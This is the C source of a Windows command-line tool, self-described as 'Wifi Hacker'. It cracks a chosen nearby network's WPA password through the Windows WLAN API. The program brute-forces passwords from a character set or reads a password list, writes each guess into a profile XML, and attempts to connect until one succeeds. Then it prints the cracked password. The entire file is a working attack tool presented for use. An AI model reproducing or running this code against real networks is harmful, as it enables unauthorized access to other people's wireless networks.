#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <wlanapi.h>
#include "tinyxml.h"
#include <time.h>
#include <math.h>

// Need to link with Wlanapi.lib and Ole32.lib
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma warning(disable : 4996)

#define MAX_PASS 64//the limit of the WPA password

char* wchar_to_char(const wchar_t* pwchar)
{
	// get the number of characters in the string.
	int currentCharIndex = 0;
	char currentChar = pwchar[currentCharIndex];

	while (currentChar != '\0')
	{
		currentCharIndex++;
		currentChar = pwchar[currentCharIndex];
	}

	const int charCount = currentCharIndex + 1;

	// allocate a new block of memory size char (1 byte) instead of wide char (2 bytes)
	char* filePathC = (char*)malloc(sizeof(char) * charCount);

	for (int i = 0; i < charCount; i++)
	{
		// convert to char (1 byte)
		char character = pwchar[i];

		*filePathC = character;

		filePathC += sizeof(char);

	}
	filePathC += '\0';

	filePathC -= (sizeof(char) * charCount);

	return filePathC;
}

wchar_t* GetWC(const char* c)
{
	const size_t cSize = strlen(c) + 1;
	wchar_t* wc = new wchar_t[cSize];
	mbstowcs(wc, c, cSize);

	return wc;
}

void ErrChk(const char* func, DWORD res)
{
	if (res != ERROR_SUCCESS)
	{
		printf("Error in %s\nError code: %llu", func, (unsigned long long)res);
		exit(res);
	}
}

char* PassGen(unsigned long long num, unsigned char base, unsigned char len,const char*letters)
{
	char* res = (char*)malloc(sizeof(char) * len+1);
	if (res == NULL)
	{
		puts("Memory allocation error...");
		exit(-1);
	}
	res[len] = 0;
	for (int i = 0; i < len; i++)
	{
		res[len - 1 - i] = letters[num % base];
		num /= base;
	}
	return res;
}

bool connected = false, next = false;
void WlanNotificationCallback(PWLAN_NOTIFICATION_DATA Arg1, PVOID Arg2)
{
	if (Arg1 != NULL && Arg2 != NULL)
	{
		WLAN_INTERFACE_INFO* intf = (WLAN_INTERFACE_INFO*)Arg2;
		if (Arg1->NotificationSource == WLAN_NOTIFICATION_SOURCE_ACM)
		{
			if (Arg1->NotificationCode == wlan_notification_acm_connection_complete)
			{
				WLAN_CONNECTION_NOTIFICATION_DATA* d = (WLAN_CONNECTION_NOTIFICATION_DATA*)(Arg1->pData);
				connected = d->wlanReasonCode == WLAN_REASON_CODE_SUCCESS;
				next = true;
			}
		}
	}
}

int main(int argc, char** argv)
{
	next = false;
	connected = false;
	const char* funcs[] = { "WlanOpenHandle", "WlanEnumInterfaces", "WlanGetInterfaceCapability", "WlanSetProfile" };
	const char* letters = NULL;
	FILE* passlst = NULL;
	bool mode = true;
	UCHAR base = 0, length = 0;
	HANDLE client;
	DWORD version, results;
	WLAN_INTERFACE_INFO_LIST* intf_lst;
	WLAN_INTERFACE_INFO intf;
	WLAN_INTERFACE_CAPABILITY* intf_cap;
	unsigned long long choice;
	PWLAN_AVAILABLE_NETWORK_LIST ssids;
	WLAN_AVAILABLE_NETWORK net;
	WLAN_BSS_LIST* bssids;
	//we need also the sample profile
	TiXmlDocument profile("WlanProfile.xml");

	//get input from user
	if (argc == 1)
	{
		puts("Usage:\n\"Wifi Hacker.exe\" /mode args\n\'mode\' can be bf (Brute Force) or pl (Passwords List).\nArgs are \'pass_length pass_characters\' for bf and \'pass_lst_path\' for pl.\n");
		return 0;
	}
	if (strcmp(argv[1], "/bf") == 0 || strcmp(argv[1], "-bf") == 0 || strcmp(argv[1], "bf") == 0)
	{
		mode = true;
		if (argc != 4)
		{
			puts("Usage:\n\"Wifi Hacker.exe\" /mode args\n\'mode\' can be bf (Brute Force) or pl (Passwords List).\nArgs are \'pass_length pass_characters\' for bf and \'pass_lst_path\' for pl.\n");
			return 0;
		}
		letters = argv[3];
		base = strlen(argv[3]);
		length = atoi(argv[2]);
		if (length<8 || length>MAX_PASS)
		{
			puts("The pass_length argument is invalid.");
			return -1;
		}
		if (base < 0)
		{
			puts("The base argument (the length of the characters_to_use) is invalid.");
			return -1;
		}
	}
	else if (strcmp(argv[1], "/pl") == 0 || strcmp(argv[1], "-pl") == 0 || strcmp(argv[1], "pl") == 0)
	{
		mode = false;
		if (argc != 3)
		{
			puts("Usage:\n\"Wifi Hacker.exe\" /mode args\n\'mode\' can be bf (Brute Force) or pl (Passwords List).\nArgs are \'pass_length pass_characters\' for bf and \'pass_lst_path\' for pl.\n");
			return 0;
		}
		//passlst = argv[2];
		fopen_s(&passlst, argv[2], "r");
		if (!passlst)
		{
			puts("Error in reading the passwords list.");
			return -1;
		}
	}
	else
	{
		puts("Usage:\n\"Wifi Hacker.exe\" /mode args\n\'mode\' can be bf (Brute Force) or pl (Passwords List).\nArgs are \'pass_length pass_characters\' for bf and \'pass_lst_path\' for pl.\n");
		return 0;
	}

	//create handle
	results = WlanOpenHandle(2, NULL, &version, &client);
	ErrChk(funcs[0], results);

	//get interfaces
	results = WlanEnumInterfaces(client, NULL, &intf_lst);
	ErrChk(funcs[1], results);
	if (intf_lst->dwNumberOfItems == 0)
	{
		puts("There are no Wifi cards in your PC!");
		return -1;
	}

	//choose interface
	puts("Please choose one of the following interfaces:\n");
	for (DWORD i = 0; i < intf_lst->dwNumberOfItems; i++)
	{
		wprintf(L"Interface ID:%llu and Name:\'%s\'\n", (unsigned long long)i, intf_lst->InterfaceInfo[i].strInterfaceDescription);
	}
	puts("Your choice (ID): ");
	do
	{
		scanf_s("%llu", &choice);
	} while (choice >= intf_lst->dwNumberOfItems);
	intf = intf_lst->InterfaceInfo[choice];

	results = WlanGetAvailableNetworkList(client, &(intf.InterfaceGuid), WLAN_AVAILABLE_NETWORK_INCLUDE_ALL_ADHOC_PROFILES, NULL, &ssids);
	ErrChk("WlanGetAvailableNetworkList", results);
	if (ssids->dwNumberOfItems == 0)
	{
		puts("No networks have been found...");
		return -1;
	}

	puts("Please choose network:\n");
	for (DWORD i = 0; i < ssids->dwNumberOfItems; i++)
	{
		printf("Network ID:%llu and Name:\'%s\'\n", (unsigned long long)i, ssids->Network[i].dot11Ssid.ucSSID);
	}
	puts("Your choice (ID): ");
	do
	{
		scanf_s("%llu", &choice);
	} while (choice >= ssids->dwNumberOfItems);
	net = ssids->Network[choice];

	//get bssids
	WlanGetNetworkBssList(client, &(intf.InterfaceGuid), &(net.dot11Ssid), net.dot11BssType, true, NULL, &bssids);
	DOT11_BSSID_LIST lst = { 0 };
	lst.Header.Type = NDIS_OBJECT_TYPE_DEFAULT;
	lst.Header.Revision = DOT11_BSSID_LIST_REVISION_1;
	lst.Header.Size = sizeof(DOT11_BSSID_LIST);
	lst.uNumOfEntries = 1;
	lst.uTotalNumOfEntries = 1;
	lst.BSSIDs[0][0] = bssids->wlanBssEntries->dot11Bssid[0];
	lst.BSSIDs[0][1] = bssids->wlanBssEntries->dot11Bssid[1];
	lst.BSSIDs[0][2] = bssids->wlanBssEntries->dot11Bssid[2];
	lst.BSSIDs[0][3] = bssids->wlanBssEntries->dot11Bssid[3];
	lst.BSSIDs[0][4] = bssids->wlanBssEntries->dot11Bssid[4];
	lst.BSSIDs[0][5] = bssids->wlanBssEntries->dot11Bssid[5];
	bssids->wlanBssEntries->dot11Bssid;

	//edit the xml file
	if (!profile.LoadFile())
	{
		puts("Error in reading file \'WlanProfile.xml\'\nMake sure it's in the current directory.");
		return -1;
	}
	char* str = (char*)malloc(sizeof(char) * net.dot11Ssid.uSSIDLength + 1);
	str[net.dot11Ssid.uSSIDLength] = 0;
	for (size_t l = 0; l < net.dot11Ssid.uSSIDLength; l++)
		str[l] = net.dot11Ssid.ucSSID[l];
	//change <name>
	profile.RootElement()->FirstChildElement()->FirstChild()->SetValue(str);
	//change <SSID><name>
	profile.RootElement()->FirstChildElement()->NextSiblingElement()->FirstChildElement()->FirstChildElement()->FirstChild()->SetValue(str);
	TiXmlElement* pass_elm = profile.RootElement()->FirstChildElement()->NextSiblingElement()->NextSiblingElement()->NextSiblingElement()->NextSiblingElement()->NextSiblingElement()->FirstChildElement()->FirstChildElement()->NextSiblingElement()->FirstChildElement()->NextSiblingElement()->NextSiblingElement();
	free(str);
	profile.SaveFile();

	//set the CallBack
	WlanRegisterNotification(client, WLAN_NOTIFICATION_SOURCE_ALL, true, WlanNotificationCallback, &intf, NULL, NULL);

	//try the passes
	for (unsigned long long i = 0, max = pow(base, length);; i++)
	{
		char* pass;
		//get password
		if (mode)
		{
			if (i >= max)
				break;
			pass = PassGen(i, base, length, letters);
		}
		else
		{
			if (getc(passlst) == EOF)
				break;
			_fseeki64(passlst, -1, SEEK_CUR);
			pass = (char*)malloc(sizeof(char) * 65);
			pass[64] = 0;
			fscanf(passlst, "%s", pass);
		}

		//save the file, then read it to the buffer 'txt'
		pass_elm->FirstChild()->SetValue(pass);
		profile.SaveFile();
		FILE* f;
		fopen_s(&f, "WlanProfile.xml", "r");
		_fseeki64(f, 0, SEEK_END);
		size_t l = _ftelli64(f);
		_fseeki64(f, 0, SEEK_SET);
		char* txt = (char*)malloc(sizeof(char) * (l + 1));
		if (txt == NULL)
		{
			puts("Memory allocation error...");
			return -1;
		}
		txt[l] = 0;
		for (size_t i = 0;; i++)
		{
			txt[i] = getc(f);
			if (txt[i] == EOF)
			{
				txt[i - 1] = 0;
				break;
			}
		}
		fclose(f);
		printf("\rTrying password: \'%s\'", pass);
		// , % llu out of% llu i + 1, max
		if (mode)
			printf(", % llu out of% llu", i + 1, max);

		WLAN_REASON_CODE rc;
		WCHAR* t = GetWC(txt);
		DWORD c = WlanSetProfile(client, &(intf.InterfaceGuid), 0, t, NULL, true, NULL, &rc);
		if (c != ERROR_SUCCESS)
		{
			wchar_t cr[BUFSIZ] = { 0 };
			WlanReasonCodeToString(rc, BUFSIZ, cr, NULL);
			fopen_s(&f, "ERR.txt", "w");
			fwrite(cr, sizeof(wchar_t), lstrlenW(cr), f);
			printf("Error in %s\nError: ", funcs[3]);
			switch (c)
			{
			case ERROR_ACCESS_DENIED:
				puts("ACCESS_DENIED");
				break;
			case ERROR_ALREADY_EXISTS:
				puts("ALREADY_EXISTS");
				break;
			case ERROR_BAD_PROFILE:
				puts("BAD_PROFILE");
				break;
			case ERROR_INVALID_PARAMETER:
				puts("INVALID_PARAMETER");
				break;
			case ERROR_NO_MATCH:
				puts("NO_MATCH");
				break;
			default:
				printf("OTHER(%llu)\n", (unsigned long long)c);
			}
			return c;
		}
		free(t);
		t = (WCHAR*)malloc(sizeof(WCHAR) * net.dot11Ssid.uSSIDLength + sizeof(WCHAR));
		if (t == NULL)
		{
			puts("Memory allocation error...");
			return -1;
		}
		for (l = 0; l < net.dot11Ssid.uSSIDLength; l++)
			t[l] = net.dot11Ssid.ucSSID[l];
		t[net.dot11Ssid.uSSIDLength] = 0;
		WLAN_CONNECTION_PARAMETERS pars = { wlan_connection_mode_profile, t, &(net.dot11Ssid), &lst, bssids->wlanBssEntries->dot11BssType, 0 };
		if (WlanConnect(client, &(intf.InterfaceGuid), &pars, NULL) != ERROR_SUCCESS)
		{
			puts("Can't connect to the network...");
			return -1;
		}
		while (!next);
		next = false;
		if (connected)
		{
			wprintf(L"\nNet \'%s\' has been cracked with password \'%s\'!\n", t, GetWC(pass));
			return 0;
		}
		//we failed... try another one!
		pass_elm = profile.RootElement()->FirstChildElement()->NextSiblingElement()->NextSiblingElement()->NextSiblingElement()->NextSiblingElement()->NextSiblingElement()->FirstChildElement()->FirstChildElement()->NextSiblingElement()->FirstChildElement()->NextSiblingElement()->NextSiblingElement();
		free(pass);
		free(txt);
		free(t);
	}
	return 0;
}